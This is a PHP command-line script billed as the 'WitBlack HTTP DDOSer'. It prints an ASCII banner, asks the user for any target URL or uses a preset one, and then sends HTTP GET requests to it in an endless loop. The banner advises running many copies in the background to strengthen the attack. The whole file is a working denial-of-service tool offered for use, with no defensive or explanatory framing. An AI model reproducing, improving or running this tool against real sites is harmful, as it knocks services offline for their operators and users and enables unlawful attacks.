#!/usr/bin/php
<?php
//If you want show default target for users fill this.
//e.g 1: 'http://192.168.1.1'
//e.g 2: 'https://site.com'
//e.g 3: 'http://site.com:8080'
//e.g 4: 'http://site.com/some-URL/file.mp4'
$Default_target = '';

//do you want allow users to use other targets?
//If your answer is yes fill this varible with true, else fill false
$Other_target = true;

//Sleep time between requests. (by sec)
$Sleep = 0;


function Banner(){
	if ($OS == 'Windows')
		echo(`cls`);
	else
		echo(`clear`);
	print(" __     __     __      __        __         | WitBlack HTTP DDOSer\n");
	print("/\\ \\   /\\ \\   /\\ \\    /\\_\\      /\\ \\        | _-_-_-_-_-_-_-_-_-_-_-_\n");
	print("\\ \\ \\  \\ \\ \\  \\ \\ \\   \\/_/     _\\_\\_\\____   |\n");
	print(" \\ \\ \\  \\ \\ \\  \\ \\ \\     __   /\\_________\\  | Web Site:\n");
	print("  \\ \\ \\  \\ \\ \\  \\ \\ \\   /\\ \\  \\/___/\\ \\__/  |     - Https://BugZone.ir\n");
	print("   \\ \\ \\__\\_\\ \\__\\_\\ \\  \\ \\ \\      \\ \\ \\    | Email:\n");
	print("    \\ \\_____________\\_\\  \\ \\_\\      \\ \\_\\   |     - admin@bugzone.ir\n");
	print("     \\/_______________/   \\/_/       \\/_/   |_____________________________\n\n");
	print(" ________     __     _________     ____________      __\n");
	print("/\\  ____ \\   /\\ \\   /\\  _____ \\   /\\  ________/\\    /\\ \\    __\n");
	print("\\ \\ \\__/\\ \\  \\ \\ \\  \\ \\_\\___/\\ \\  \\ \\ \\______/\\ \\   \\ \\ \\  / /\\\n");
	print(" \\ \\ \\_\\_\\ \\  \\ \\ \\  \\/_/___\\_\\ \\  \\ \\ \\     \\/_/__  \\ \\ \\/ / /\n");
	print("  \\ \\  ____ \\  \\ \\ \\   /\\  _____ \\  \\ \\ \\       /\\ \\  \\ \\ \\/_/____ \n");
	print("   \\ \\ \\__/\\ \\  \\ \\ \\  \\ \\ \\___/\\ \\  \\ \\ \\      \\ \\ \\  \\ \\  ___ \\ \\\n");
	print("    \\ \\ \\_\\_\\ \\  \\ \\ \\  \\ \\ \\__\\_\\ \\  \\ \\ \\______\\/  \\  \\ \\ \\  \\ \\ \\\n");
	print("     \\ \\_______\\  \\ \\_\\  \\ \\________\\  \\ \\___________/   \\ \\_\\  \\ \\_\\\n");
	print("      \\/_______/   \\/_/   \\/________/   \\/__________/     \\/_/   \\/_/\n");
	print("\nProgramed By WitBlack HAcker. - Git ~> Https://GitHub.com/WitBlack\n");
	print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
	print("Note: If you want have good attack run many of this script in background.\n");
	print("VERSION 1.0.0\n\n");
	print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n\n");
}
if (is_dir('C:'))
	$OS = 'Windows';
elseif (is_dir('/tmp/'))
	$OS = 'Linux';
else
	exit("Your OS don't suported! :(");
Banner();
if (strlen($Default_target) > 0){
	print('Default target is: "' . $Default_target . "\"\n");
	$User_choose = readline('Do you want DDOS on default target? [y/n]');
	if (strtolower($User_choose) != 'y' and strtolower($User_choose) != 'yes'){
		print("\n-----------------------------------------\n[*] Your choose: no\n");
		if ($Other_target){
			print("[*] Note: You should use target like this Examples.\n");
			print("[*] Example: http://192.168.1.1/some-URL/file.mp4\n");
			print("[*] Example: https://site.com:8080");
			print("[*] Example: http://site.com\n-----------------------------------------\n\n");
			$Default_target = readline('Enter your target: ');
		}
		else {
			print("[!] Access denied, You can't DDOS on other targets.");
      exit("\n[!] Admin don't allowed this action for you.\n-----------------------------------------\n");
		}
	}
}
else{
	print("[*] Note: You should use target like this Examples.\n");
	print("[*] Example: http://192.168.1.1/some-URL/file.mp4\n");
	print("[*] Example: https://site.com:8080");
	print("[*] Example: http://site.com\n-----------------------------------------\n\n");
	$Default_target = readline('Enter your target: ');
}
Banner();
print("\n\n[*] DDOS attack started! Use CTRL + C to break.");
while (true){
	if ($Sleep > 0)
		sleep($Sleep);
	print("\n[+] Send and revirce packets...");
	file_get_contents($Default_target);
}
?>
